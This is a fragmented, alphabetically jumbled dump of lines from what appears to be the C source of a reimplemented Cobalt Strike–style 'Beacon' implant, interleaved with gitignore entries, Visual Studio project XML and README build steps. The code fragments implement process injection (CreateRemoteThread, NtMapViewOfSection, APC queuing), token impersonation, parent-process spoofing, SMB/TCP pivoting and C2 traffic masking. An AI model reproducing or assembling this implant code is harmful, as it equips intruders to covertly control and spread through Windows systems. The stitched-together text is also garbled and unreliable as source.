+"int RandomIntInRange(int min, int max)"
+"int RoundToNearestMultiple(int value, int multiple)"
+"int ToNetbios(char nb, const char"
+"int ToNetbios(const char nb, const char"
+"int WebResponseReceiveUntilNewline(SOCKET socket, char"
+"int bindResult = bind(socket, (SOCKADDR"
+"int dwSize = max(S_PROCINJ_MINALLOC, size)"
+"int fullPathSize = GetFullPathNameA(lpFileName, MAX_FILENAME, lpBuffer, NULL)"
+"int i, j"
+"int ioctlresult = ioctlsocket((SOCKET)channel->socket, FIONREAD, "
+"int len = vsnprintf(format->buffer, format->size - format->length, fmt, args)"
+"int length = GetCurrentDirectoryA(sizeof(data), data)"
+"int listenResult = listen(socket, 120)"
+"int main(int argc, char"
+"int pOffset, char"
+"int read = protocol->read(protocol, buffer, sizeof(buffer))"
+"int read = recv(socket, data "
+"int read, totalRead"
+"int received = recv(protocol->channel.socket, buf, sizeof(char), MSG_PEEK)"
+"int received = recv(socket, buffer "
+"int sent = send((SOCKET)channel->socket, buffer, length, 0)"
+"int size = min(length, MAX_CMD)"
+"int size = offsetof(ROUTE_DATA, data)"
+"int toRead = min(chunkMaxSize, download->remainingData)"
+"int totalHeaderRead = ProtocolSmbPipeRead(protocol->channel.handle, header, headerSize)"
+"int totalHeaderRead = ProtocolTcpSocketRead(protocol->channel.socket, header, headerSize)"
+"int totalReceived = ChannelReceiveDataInternal((SOCKET)channel->socket,"
+"int x = i - STRLEN("""
+"lPi, hRead, hWrite, ""process"")"
+"libtomcrypt_VS2008.vcxproj"", ""{E3802982-DCB6-4D85-A2BD-6B08F0657E79}"""
+"libtomcrypt_VS2008.vcxproj"">"
+"libtommath_VS2008.vcxproj"", ""{42109FEE-B0B9-4FCD-9E56-2863BF8C55D2}"""
+"localTime.wHour, localTime.wMinute, localTime.wSecond,"
+"localTime.wMonth, localTime.wDay, localTime.wYear,"
+"locals, ""%s"
+"locals, ""%u"", logicalDrives)"
+"locals, ""D"
+"locals, ""F"
+"locals, 0x200000)"
+"locals, 0x8000)"
+"locals, 128)"
+"locals, channel->port)"
+"locals, channelId)"
+"locals, isPending)"
+"locals, reqno)"
+"locals, value)"
+"locals,"
+"lpAttributeList,"
+"lpBaseAddress, 0, 0, NULL, "
+"lpCommandLine,"
+"lpCurrentDirectory,"
+"lpDomain,"
+"lpParameter,"
+"lpPassword,"
+"lpStartAddress,"
+"lpTotalBytesAvail, NULL))"
+"lpUsername,"
+"lpVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)"
+"lpszAgent,"
+"lpszServerName,"
+"memcpy(aux, after, afterLength)"
+"memcpy(buffer, b, bufferSize)"
+"memcpy(buffer, cmd, size)"
+"memcpy(buffer, parser->buffer, parser->length)"
+"memcpy(buffer, ptr, parser->length)"
+"memcpy(dst, buffer, length)"
+"memcpy(format->buffer, text, len)"
+"memcpy(gCbcKey, mask, sizeof(gCbcKey))"
+"memcpy(gHmacKey, mask "
+"memcpy(gImportedPshScript, buffer, size)"
+"memcpy(gIv, INIT_VECTOR, STRLEN(INIT_VECTOR))"
+"memcpy(gSession.data, format.original, format.length)"
+"memcpy(lpFileMap, payload, size)"
+"memcpy(name, buffer, length)"
+"memcpy(pAlloc, payload, size)"
+"memcpy(pAllocedData->payload, (PVOID)NtQueueApcThreadProc, payloadSize)"
+"memcpy(recoverable, temp "
+"memcpy(recoverable, temp, recoverableLength)"
+"memcpy(substr, ""system32"", STRLEN(""system32""))"
+"memcpy(temp, recoverable, param)"
+"memcpy(transform->headers, transform->temp, MAX_HEADERS)"
+"memcpy(transform->temp, param, paramLength)"
+"memcpy(transform->temp, transform->transformed, transformedLength)"
+"memcpy(transform->transformed, response, response_len)"
+"memcpy(transform->transformed, session, session_len)"
+"memcpy(transform->transformed, transform->temp, transformedLength)"
+"memcpy(transform->uri, transform->temp, MAX_URI)"
+"memcpy(transform->uriParams, transform->temp, MAX_URI_PARAMS)"
+"memcpy(webResponse->content, content, contentLength)"
+"memset(bid, 0, sizeof(bid))"
+"memset(buffer, 0, MAX_BUFFER)"
+"memset(buffer, 0, size)"
+"memset(cmd, 0, MAX_CMD)"
+"memset(dst, 0, size)"
+"memset(entry->record.ptr, 0, entry->record.size)"
+"memset(finalUri, 0, sizeof(finalUri))"
+"memset(format.original, 0, format.length)"
+"memset(gSpawnToX64, 0, MAX_SPAWN_TO_X64)"
+"memset(gSpawnToX86, 0, MAX_SPAWN_TO_X86)"
+"memset(newCmd, 0, commandLine.MaximumLength)"
+"memset(param, 0, sizeof(param))"
+"memset(parser->original, 0, parser->size)"
+"memset(transform->temp, 0, transform->outputLength)"
+"memset(transform->transformed, 0, transform->outputLength)"
+"mode, NULL, NULL))"
+"n""))"
+"n"", """", __VA_ARGS__)"
+"n"", current->expandedFullCmd)"
+"n"", filename)"
+"n"", job->id, job->pid32, job->description)"
+"n"", name)"
+"n"", transform->headers, S_HOST_HEADER)"
+"n"", transform->headers, isHostHeaderStepDone "
+"n"", transform->headers, param)"
+"n"", transform->headers, param, transform->transformed)"
+"nServerPort,"
+"nameLength, domain, "
+"ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, "
+"oemcp, 2)"
+"of this software and associated documentation files (the ""Software""), to deal"
+"out, sizeof(out), NULL)"
+"pData->pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pData->lpStartAddress, pData->lpAddress, 0, NULL)"
+"parentContext,"
+"parentPid,"
+"parser = (datap){ buffer, buffer, size, size }"
+"parser, "
+"parser, 0x4000)"
+"parser, IS_X64() "
+"parser, S_PROCINJ_EXECUTE, 128)"
+"parser, appendSize)"
+"parser, args, MAX_ARGS)"
+"parser, argumentLength) : NULL"
+"parser, buffer, length)"
+"parser, buffer, read)"
+"parser, buffer, size)"
+"parser, cmd, 0x4000))"
+"parser, cmd, MAX_CMD)"
+"parser, data, size)"
+"parser, description, MAX_DESCRIPTION)"
+"parser, description, sizeof(description)))"
+"parser, domain, 0x400))"
+"parser, domain, MAX_DOMAIN))"
+"parser, dst, MAX_DST)"
+"parser, existingFileName, MAX_EXISTING_FILENAME)"
+"parser, expandedFull, MAX_EXPANDED_FULL)"
+"parser, filename, MAX_FILENAME)"
+"parser, filename, sizeof(filename)))"
+"parser, headerLength)"
+"parser, lpFileName, 0x400)"
+"parser, lpFileName, MAX_FILENAME)"
+"parser, name, sizeof(name))"
+"parser, newFileName, MAX_NEW_FILENAME)"
+"parser, original, MAX_ORIGINAL)"
+"parser, param, sizeof(param))"
+"parser, password, 0x400))"
+"parser, password, MAX_PASSWORD))"
+"parser, prependSize)"
+"parser, recover, maxGet)"
+"parser, request_profile, MAX_REQUEST_PROFILE)"
+"parser, runnableCmd, MAX_RUNNABLE_CMD)"
+"parser, setting, headerSize)"
+"parser, size)"
+"parser, src, MAX_SRC)"
+"parser, text, sizeof(text))"
+"parser, username, 0x400))"
+"parser, username, MAX_USERNAME))"
+"pe.szExeFile,"
+"pe.th32ParentProcessID,"
+"pe.th32ProcessID,"
+"peb->ProcessParameters, "
+"pi, 0, FALSE)"
+"pi, CREATE_NEW_CONSOLE, FALSE))"
+"pi, CREATE_NEW_CONSOLE, FALSE, pid)"
+"pi, data, size, 0, NULL, 0)"
+"pi, hRead, hWrite, description)"
+"pi, payload, payloadLength, 0, NULL, 0)"
+"pi, payload, payloadLength, reflectiveLoaderOffset, argument, argumentLength)"
+"pi, pid))"
+"pipe = CreateFileA(lpFileName, GENERIC_READ "
+"pipe, "
+"port, sizeof(port))"
+"pragma code_seg(push, "".text$KKK000"")"
+"pragma code_seg(push, "".text$KKK001"")"
+"pragma code_seg(push, "".text$KKK002"")"
+"pragma code_seg(push, "".text$KKK003"")"
+"pragma comment(lib, ""ws2_32.lib"")"
+"processParameters, sizeof(peb->ProcessParameters), NULL))"
+"processParameters.CommandLine, "
+"protocol, channel->port "
+"protocol, file)"
+"protocol, port "
+"protocol, port))"
+"protocol, sock)"
+"proxy,"
+"read = pProtocol->read(pProtocol, gRouteAux->data, MAX_ROUTE_AUX - offsetof(ROUTE_DATA, data))"
+"read = recv(channel, buffer "
+"read, NULL)"
+"read, NULL))"
+"readfds, "
+"recoverable, recoverableLength, "
+"recoverableLength = XorUnmask(recoverable, recoverableLength, temp, maxGet)"
+"relocationsParser, relocations, relocationsPair.size)"
+"relocationsParser, sizeof(RELOCATION))"
+"relocationsParser, sizeof(RELOCATION)))"
+"result = IdentityGetUserInfo(hToken, accountName, length)"
+"result = PipeConnect(filename, pipe, 0)"
+"result = TransformDecode(S_C2_RECOVER, data, totalBytesRead, maxGet)"
+"return BeaconDataPtr(parser, size)"
+"return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL"
+"return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL"
+"return CreateThread(NULL, 0, gThreadStartAddress, pThreadInfo->lpStartAddress, 0, NULL)"
+"return CreateThread(NULL, 0, lpStartAddress, lpParameter, 0, NULL)"
+"return CreateThreadWithCfgCaution(lpStartAddress, lpParameter)"
+"return ExpandEnvironmentStringsA(lpSrc, lpDst, size)"
+"return ExpandEnvironmentStrings_s(lBuffer, expanded, size)"
+"return InjectViaNtMapViewOfSection(injection->process, injection->pid, payload, size)"
+"return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size)"
+"return PipeConnect(filename, pipe, flags)"
+"return PipeConnectWithTokenNoFlags(filename, pipe)"
+"return PipeWaitForData(protocol->channel.handle, waitTime, iterWaitTime)"
+"return ProtocolSmbPipeRead(hPipe, buffer, headerSize)"
+"return ProtocolSmbPipeRead(protocol->channel.handle, buffer, dataSize)"
+"return ProtocolSmbPipeWrite(protocol->channel.handle, buffer, length)"
+"return ProtocolTcpSocketRead(protocol->channel.socket, buffer, dataSize)"
+"return ProtocolTcpSocketWrite(protocol->channel.socket, buffer, length)"
+"return RoundToNearestMultiple(value, 2)"
+"return RunAsUserInternal(lpDomain, lpUsername, lpPassword, cmd, CREATE_SUSPENDED, lpProcessInfo)"
+"return RunUnder(cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken, gParentPid)"
+"return RunUnder(cmd, strlen(cmd), si, pi, CREATE_SUSPENDED, ignoreToken, pid)"
+"return RunUnderParent(cmd, strlen(cmd), si, pInfo, CREATE_SUSPENDED, ignoreToken)"
+"return SpawnProcessWithLogon(runUnderConfig, cmd, lpCurrentDirectory)"
+"return _IsWow64Process(hProcess, "
+"return send(channel, buffer, length, 0) != SOCKET_ERROR"
+"return strtok(gCopiedDefaultDomains, "","")"
+"rng_get_bytes(out, sizeof(out), NULL)"
+"runUnderConfig, 0)"
+"runUnderConfig->creationFlags,"
+"runUnderConfig->startupInfo,"
+"sa, 0x100000)"
+"sb = (sizedbuf){ data, size }"
+"select(0, "
+"select(0, NULL, "
+"send(acceptSocket, webResponse->content, webResponse->contentLength, 0)"
+"send(acceptSocket, webResponse->header, webResponse->headerLength, 0)"
+"send(targetSocket, packed, packedLength, 0)"
+"service, sizeof(service))"
+"shutdown((SOCKET)channel->socket, SD_BOTH)"
+"shutdown(protocol->channel.socket, SD_BOTH)"
+"shutdown(socket, SD_BOTH)"
+"si, "
+"si->hStdError, 0, TRUE, DUPLICATE_SAME_ACCESS "
+"si->hStdOutput, 0, TRUE, DUPLICATE_SAME_ACCESS "
+"si.hStdError, 0, sizeof(si.hStdError))"
+"si.hStdInput, 0, sizeof(si.hStdInput))"
+"si.hStdOutput, 0, sizeof(si.hStdOutput))"
+"size = min(size, CHANNEL_BUFFER_SIZE - sizeof(int))"
+"sleepTime, 1000 "
+"snprintf(bid, sizeof(bid), ""%d"", gSession.bid)"
+"snprintf(buffer, size, ""%s"
+"snprintf(finalUri, sizeof(finalUri), ""%s"", transform.uri)"
+"snprintf(finalUri, sizeof(finalUri), ""%s%s"", transform.uri, transform.uriParams)"
+"snprintf(info, sizeof(info), ""%s"
+"snprintf(lBuffer, sizeof(lBuffer), ""%s"", spawnTo)"
+"snprintf(lpFileName, MAX_FILENAME, ""%s"
+"snprintf(lpFileNameInternal, MAX_FILENAME, ""%s"", lpCurrentFindFileData->cFileName)"
+"snprintf(transform->temp, MAX_TEMP, """
+"snprintf(transform->temp, MAX_TEMP, ""%s"
+"snprintf(transform->temp, MAX_TEMP, ""%s%s"
+"snprintf(transform->temp, MAX_TEMP, ""%s%s"", transform->uri, transform->transformed)"
+"snprintf(transform->temp, MAX_TEMP, ""%s%s: %s"
+"snprintf(transform.uri, MAX_URI, ""%s"", uri)"
+"snprintf(uidString, sizeof(uidString), BeaconIsAdmin() "
+"snprintf(webResponse->header,"
+"sock = accept(channel->socket, NULL, NULL)"
+"sockaddr, sizeof(sockaddr)) == SOCKET_ERROR"
+"sockaddr, sizeof(sockaddr)) == SOCKET_ERROR)"
+"sockaddr.sin_addr, lHostent->h_addr, lHostent->h_length)"
+"statusCodeLength, NULL))"
+"strncat_s(cmd, MAX_CMD, args, MAX_ARGS)"
+"strncat_s(cmd, MAX_CMD, expandedCmd, MAX_EXPANDED_CMD)"
+"strncat_s(filename, MAX_FILENAME, SOURCE_DIRECTORY, STRLEN(SOURCE_DIRECTORY))"
+"strncpy(cmd, buffer, length)"
+"strncpy(copiedDomains, domains, strlen(domains) "
+"strncpy(gCopiedDefaultDomains, domains, srcLength "
+"strncpy(job->description, description, sizeof(job->description))"
+"strncpy(path, buffer, length)"
+"struct timeval lTimeval = { 0, 100 }"
+"struct timeval timeout = { 0, 100 }"
+"systemTime, "
+"t%s"", computerName, userName, executable)"
+"target = InjectLocally(payload, size)"
+"target = InjectRemotely(injection, payload, size)"
+"targetSocket = LinkViaTcpConnect(target, port)"
+"temp, maxGet)"
+"threadInfo->lpVirtualFree(threadInfo, 0, MEM_RELEASE)"
+"timeout, sizeof(timeout))"
+"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
+"toWideChar(cmd, lpCommandLine, 0x4000)"
+"toWideChar(domain, gIdentityDomain, IDENTITY_MAX_WCHARS_DOMAIN)"
+"toWideChar(domain, lpDomain, 0x400)"
+"toWideChar(password, gIdentityPassword, IDENTITY_MAX_WCHARS_PASSWORD)"
+"toWideChar(password, lpPassword, 0x400)"
+"toWideChar(username, gIdentityUsername, IDENTITY_MAX_WCHARS_USERNAME)"
+"toWideChar(username, lpUsername, 0x400)"
+"toWrite = min(toWrite, 0x2000)"
+"tokenPrivileges, 0, NULL, NULL))"
+"totalBytesAvail, NULL))"
+"transform, 0, sizeof(transform))"
+"transform, S_C2_POSTREQ, bid, strlen(bid), gPostBuffer, gPostBufferLength)"
+"transform, S_C2_REQUEST, session->data, session->length, NULL, 0)"
+"transform, gPostBufferLength)"
+"transform, maxGet)"
+"transform->body = BeaconDataPtr(parser, transform->outputLength)"
+"transform->headers = BeaconDataPtr(parser, MAX_HEADERS)"
+"transform->temp = BeaconDataPtr(parser, transform->outputLength)"
+"transform->transformed = BeaconDataPtr(parser, transform->outputLength)"
+"transform->uri = BeaconDataPtr(parser, MAX_URI)"
+"transform->uriParams = BeaconDataPtr(parser, MAX_URI_PARAMS)"
+"transformedLength = XorMask(transform->transformed, transformedLength, transform->temp, transform->outputLength)"
+"username"" and store it in the buffer."
+"va_start(args, fmt)"
+"value, sizeof(char))"
+"value, sizeof(int))"
+"value, sizeof(short))"
+"void   BeaconGetSpawnTo(BOOL x86, char "
+"void   BeaconInjectProcess(HANDLE hProcess, int pid, char "
+"void   BeaconOutput(int type, char "
+"void   BeaconPrintf(int type, char "
+"void BeaconErrorD(int type, int d1)"
+"void BeaconErrorDD(int type, int d1, int d2)"
+"void BeaconErrorDDS(int type, int d1, int d2, char"
+"void BeaconErrorDS(int type, int d1, char "
+"void BeaconErrorPrintf(int type, char "
+"void BeaconErrorS(int type, char "
+"void BeaconGetSpawnTo(BOOL x86, char"
+"void BeaconInjectProcess(HANDLE hProcess, int pid, char"
+"void ChannelAdd(SOCKET socket, int id, int timeoutPeriod, int type, int port, int state)"
+"void JobSpawnInternal(int callbackType, int waitTime, int reflectiveLoaderOffset, char"
+"void NetworkConfigureHttp(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszAgent)"
+"void NetworkStatusCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)"
+"void SpawnToFix(BOOL x86, char"
+"void TaskDispatch(int cmd, char"
+"void WebServerInit(short port, char"
+"while (!ConnectNamedPipe(hPrenamedPipe, NULL) "
+"while (!PipeConnectWithToken(filename, "
+"while (WebResponseReceiveUntilNewline(acceptSocket, webResponse->data, MAX_DATA_SIZE) > STRLEN("""
+"while(!PipeConnectWithToken(text, "
+"writefds, "
+"wrote, NULL)"
+"wrote, NULL)) {"
+"wrote, NULL))"
+"x1b[0m"""
+"x1b[31m"""
+"x1b[32m"""
+"x1b[33m"""
+"x1b[35m"""
+"x1b[36m"""
+"x64"">"
+"x64'"" Label=""Configuration"">"
+"x64'"">"
+"x64'"">Create</PrecompiledHeader>"
+"xml version=""1.0"" encoding=""utf-8"""
+"} APC_ROUTINE_CONTEXT, "
+"} DATA_STORE_OBJECT, "
+"} RECORD, HEAP_RECORD"
+"} RUN_UNDER_CONTEXT, "
+"} SECTION_INHERIT, "
+"} THREAD_INFO, "
+"} WEB_RESPONSE, "
+"} while (FindNextFileA(firstFile, "
+"} while (FindNextFileA(hFindFile, lpCurrentFindFileData))"
+"} while (Process32Next(toolhelp, "
+"} while (Thread32Next(hSnapshot, "
+$(Configuration)
+$(Platform)'=='Debug
+$(Platform)'=='Release
+$(Platform)</IntDir>
+$(Platform)</OutDir>
+$tf/
+%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+%(PreprocessorDefinitions)</PreprocessorDefinitions>
+((ULONGLONG)findData.nFileSizeHigh << 32) 
+(LPSTARTUPINFOW)
+(char
+(int
+(long
+(short
+(sizeof(DWORD)))))
+(step == STEP_BASE64 
+(unsigned long
+)(char
+)(code 
+)(header 
+)-1)
+)BeaconDataPtr(
+)NtCurrentTeb() 
+)api 
+)ch->next)
+)format.buffer
+)gChannelBuffer = htonl(channel->id)
+)lpApcContext == NULL)
+)lpBaseAddress
+)malloc(0x4000)
+)malloc(maxsz)
+)malloc(size 
+)malloc(size)
+)malloc(sizeof(ARGUMENT_ENTRY))
+)malloc(sizeof(JOB_ENTRY))
+)malloc(sizeof(datap))
+)out = RandomInt()
+)parser->buffer
+)parser->buffer)
+)payload
+)reg
+- [Bb]ackup ([0-9]).rdl
+- [Bb]ackup ([0-9][0-9]).rdl
+- [Bb]ackup.rdl
+- [libtomcrypt](https://github.com/libtom/libtomcrypt): A modular and portable cryptographic toolkit.
+--gThreadsActive
+.DOC   diff=astextplain
+.DOCX  diff=astextplain
+.DOT   diff=astextplain
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.DotSettings.user
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.PDF   diff=astextplain
+.RTF   diff=astextplain
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.appx
+.appxbundle
+.appxupload
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cachefile
+.callback = cleanupCallback
+.coverage
+.coveragexml
+.cr/personal
+.cs     diff=csharp
+.csproj    merge=binary
+.dbmdl
+.dbproj    merge=binary
+.dbproj.schemaview
+.doc   diff=astextplain
+.docx  diff=astextplain
+.dot   diff=astextplain
+.dotCover
+.e2e
+.fake/
+.fid = gDownloadFid
+.fsproj    merge=binary
+.gif   binary
+.gpState
+.hhc
+.hhk
+.hhp
+.htm
+.ilk
+.info
+.iobj
+.ionide/
+.ipdb
+.jfm
+.jmconfig
+.jpg   binary
+.json
+.ldf
+.local.xml
+.localhistory/
+.log
+.lsproj    merge=binary
+.mdf
+.meta
+.mfractor/
+.mm.
+.modelproj merge=binary
+.ncb
+.ndf
+.next = gChannels
+.next = gDownloads
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.paket/paket.exe
+.pch
+.pdb
+.pdf   diff=astextplain
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.png   binary
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl.data
+.record = {
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.rtf   diff=astextplain
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.size = gRecords[i].record.size
+.size = length
+.sln       merge=binary
+.sln.docstates
+.snk
+.snupkg
+.sqlproj   merge=binary
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbproj    merge=binary
+.vbw
+.vcproj    merge=binary
+.vcxproj   merge=binary
+.vs/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.wixproj   merge=binary
+.wwaproj   merge=binary
+.xml
+.xsd.cs
+// 1. Sections
+// Add the new function to the found empty slot
+// Add to the end of the list
+// Allocate a buffer to store user information
+// Allocate and initialize a security identifier (SID) for the built-in administrators group.
+// Call the NtQueueApcThread function in the target process
+// Check if snapshot creation failed or there are no threads in the process
+// Check if the current function matches the one we're looking for
+// Check if the current token (security context) is a member of the specified group SID.
+// Check if the thread is in the process we want to inject into
+// Check if we found an empty slot for a new function
+// Clear the buffer and free the allocated memory
+// Close handles associated with completed jobs
+// Close the snapshot handle
+// Close the thread
+// Copy the file
+// Create a new entry for the new argument
+// Create a toolhelp snapshot of the process
+// Create the directory
+// Define the SID_IDENTIFIER_AUTHORITY structure and initialize it with the SECURITY_NT_AUTHORITY constant.
+// Duplicate the token with maximum allowed access rights
+// FIXME: DNS Settings here...
+// FIXME: I do not understand why is this freed just only when an error occurs... I'm not sure if this is purposeful or not. Maybe a memory leak
+// For each active argument
+// Free the allocated SID and return the result.
+// Free the memory allocated for the credentials format.
+// Get host by name
+// Get the token information for the given token handle.
+// Get user information from the token and store it in the buffer
+// Impersonate the logged-on user using the duplicated token
+// Impersonate the logged-on user using the specified token
+// Indicate the attributes of the process to be created.
+// Initialize the process attribute list
+// Inject the payload into the spawned process using InjectProcess.
+// Iterate through the dynamic function array
+// Iterate through the threads in the snapshot
+// Localhost for little endian
+// Lookup the account SID to retrieve the username and domain.
+// Mark the thread as executed and write it back to the allocated memory
+// Move the file
+// Open the parent process with full access
+// Open the thread
+// Read the APC thread data from the allocated memory
+// Relocate a 32-bit absolute reference
+// Relocate a 32-bit relative reference
+// Report the new token to the user
+// Reset the token.
+// Restore the error mode
+// Return TRUE if the thread was executed
+// Reuse this entry for the new argument
+// Set the error mode to prevent error dialogs
+// Set the process attribute for the child process
+// Sleep to give the thread time to execute
+// Spawn a temporary process.
+// Store the current slot as a potential location for the new function
+// Store the handle to the parent process
+// Update the process attribute list
+// Use EBX
+// Use RDX
+// call NtMapViewOfSection to map the file into the target process
+// check if the file was mapped
+// clear the standard input
+// close the file mapping object
+// copy the payload into the mapped file
+// copy the rest of the string
+// determine the size of the buffer required to store the expanded string
+// expand the string
+// map a view of the file into the process's address space (use MapViewOfFile)
+// unmap the file from the current process
+//CreateThread typedef
+//Only SHA256 is needed
+/Beacon/settings.h
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+/libtomcrypt/
+/libtommath/
+1. Clone the repository:
+2. Open the project in Visual Studio.
+4. Build the project.
+5. Create your 
+6. Build the project again to apply your custom settings.
+7. Execute the compiled binary.
+</Project>
+= (SECURITY_FLAG_IGNORE_REVOCATION 
+= 16 - (length % 16)
+= 2)
+= CREATE_SUSPENDED
+= EXTENDED_STARTUPINFO_PRESENT
+= INTERNET_FLAG_SECURE 
+= METADATA_FLAG_ADMIN
+= RECORD_CAPACITY_INCREMENT
+= len
+= paramLength
+= prependSize
+= read
+= read)
+= received
+= size
+= sizeof(char)
+= sizeof(int)
+= sizeof(short)
+= wrote)
+= wrote) {
+APC_ROUTINE_CONTEXT
+ARGUMENT_ENTRY
+ASALocalRun/
+AppPackages/
+ArgumentList()
+AutoTest.Net/
+BOOL   BeaconIsAdmin(void)
+BOOL   BeaconUseToken(HANDLE token)
+BOOL   toWideChar(char 
+BOOL  SpawnProcessWithTokenOrLogon(RUN_UNDER_CONFIG
+BOOL (
+BOOL AdjustMemoryPermissions(char
+BOOL ArgumentFindMatch(EXPANDED_CMD
+BOOL BeaconAddValue(const char 
+BOOL BeaconIsAdmin(void)
+BOOL BeaconIsExpired()
+BOOL BeaconRemoveValue(const char 
+BOOL BeaconUseToken(HANDLE token)
+BOOL ChannelIsBindValid(short port)
+BOOL ExecuteInjection(INJECTION
+BOOL ExecuteViaCreateThread(INJECTION
+BOOL ExecuteViaNtQueueApcThread(INJECTION
+BOOL ExecuteViaNtQueueApcThread_s(INJECTION
+BOOL ExecuteViaSetThreadContext(INJECTION
+BOOL FilesystemIsDirectory(char
+BOOL IsProcess64Bit(HANDLE hProcess)
+BOOL IsWow64ProcessEx(HANDLE hProcess)
+BOOL LinkAdd(PROTOCOL
+BOOL NetworkCheckResponse(HINTERNET hInternet)
+BOOL ProcessCmdAdjust(PROCESS_INFORMATION
+BOOL ProcessKill(char
+BOOL ProcessRelocation(RELOCATION
+BOOL ProtocolSmbWaitForData(PROTOCOL
+BOOL ProtocolSmbWrite(PROTOCOL
+BOOL ProtocolTcpWaitForData(PROTOCOL
+BOOL ProtocolTcpWrite(PROTOCOL
+BOOL RunIsSameSessionAsCurrent(int pid)
+BOOL RunProcessWithAdjustedCmd(RUN_UNDER_CONFIG
+BOOL RunUnder(char
+BOOL RunUnderParent(char
+BOOL RunUnder_(RUN_UNDER_CONFIG
+BOOL SelfIsWindowsVistaOrLater()
+BOOL SpawnProcess(RUN_UNDER_CONFIG
+BOOL SpawnProcessWithLogon(RUN_UNDER_CONFIG
+BOOL StrategyMarkRetry(
+BOOL Wow64Process = FALSE
+BOOL disableWow64FsRedirection = BeaconDataShort(
+BOOL gBlockDlls
+BOOL gIdentityIsLoggedIn
+BOOL gIsHeapFiltering = TRUE
+BOOL gNetworkIsInit = FALSE
+BOOL ignoreToken
+BOOL isActive
+BOOL isAdmin
+BOOL isExecuted
+BOOL isHeap
+BOOL isHostHeaderStepDone = FALSE
+BOOL isMsgMode
+BOOL isOpen
+BOOL isProcessX64
+BOOL isProcessX64 = IsProcess64Bit(hProcess)
+BOOL isSameArchAsHostSystem
+BOOL isSamePid
+BOOL isTemporary
+BOOL isThereHostHeader = S_HOST_HEADER 
+BOOL isWow64 = IsWow64ProcessEx(hProcess)
+BOOL isX64
+BOOL kernel32$Wow64DisableWow64FsRedirection(PVOID
+BOOL kernel32$Wow64RevertWow64FsRedirection(PVOID OldValue)
+BOOL masked
+BOOL result
+BOOL result = FALSE
+BOOL result = SpawnProcess(execution)
+BOOL result = TRUE
+BOOL shouldCreateInternetOpen = TRUE
+BOOL(WINAPI
+BYTE
+Backup
+BeaconAPI(api)
+BeaconCleanupProcess(
+BeaconDataFree(locals)
+BeaconDataFree(parser)
+BeaconDataFree(transform->parser)
+BeaconDataParse(
+BeaconDataStringCopy(
+BeaconDataStringCopySafe(
+BeaconDataZero(
+BeaconDataZero(parser)
+BeaconErrorNA(ERROR_ADJUST_ARGUMENTS_BY_ARCH_FAILED)
+BeaconErrorNA(ERROR_CONNECT_TO_PIPE_TIMEOUT)
+BeaconErrorNA(ERROR_MAXIMUM_LINKS_REACHED)
+BeaconErrorNA(ERROR_OPEN_PROCESS_TOKEN_PRIVS_FAILED)
+BeaconErrorNA(ERROR_OPEN_TOKEN_FAILED)
+BeaconErrorNA(ERROR_REAL_FAKE_ARGS_NO_MATCH)
+BeaconErrorNA(ERROR_STAGER_VIA_TCP_CONNECTION_FAILED)
+BeaconFormatAlloc(
+BeaconFormatAppend(
+BeaconFormatChar(
+BeaconFormatFree(
+BeaconFormatFree(gIdentityCredentialsParser)
+BeaconFormatInt(
+BeaconFormatPrintf(
+BeaconFormatShort(
+BeaconFormatUse(
+BeaconInjectTemporaryProcess(
+BeaconOutput(isPending 
+BeaconRevertToken()
+BenchmarkDotNet.Artifacts/
+BundleArtifacts/
+CHANNEL channel
+CHANNEL_ENTRY
+CHAR
+CHAR domain[0x200] = { 0 }
+CHAR finalUri[MAX_URI]
+CHAR name[0x200] = { 0 }
+CHAR payload[]
+CHAR tokenInfo[0x1000]
+CLIENT_ID ClientId
+CONTEXT context
+CONTEXT ctx
+ChannelHandleActivity()
+ChannelRemoveAllInactive()
+ChildProcessContextInit(
+ClientBin/
+ClientId)
+CloseHandle(
+CloseHandle(context->handle)
+CloseHandle(file)
+CloseHandle(gIdentityToken)
+CloseHandle(hFile)
+CloseHandle(hFileMapping)
+CloseHandle(hPrenamedPipe)
+CloseHandle(hProcess)
+CloseHandle(hSnapshot)
+CloseHandle(hThread)
+CloseHandle(hToken)
+CloseHandle(job->hRead)
+CloseHandle(job->hWrite)
+CloseHandle(job->process)
+CloseHandle(job->thread)
+CloseHandle(pInfo->hProcess)
+CloseHandle(pInfo->hThread)
+CloseHandle(protocol->channel.handle)
+CloseHandle(toolhelp)
+Copyright (c) 2024 ElJaviLuki
+CreatePipe(
+CryptoSetupSha256AES(out)
+DOWNLOAD_ENTRY
+DWORD 
+DWORD   sleep_mask_text_size
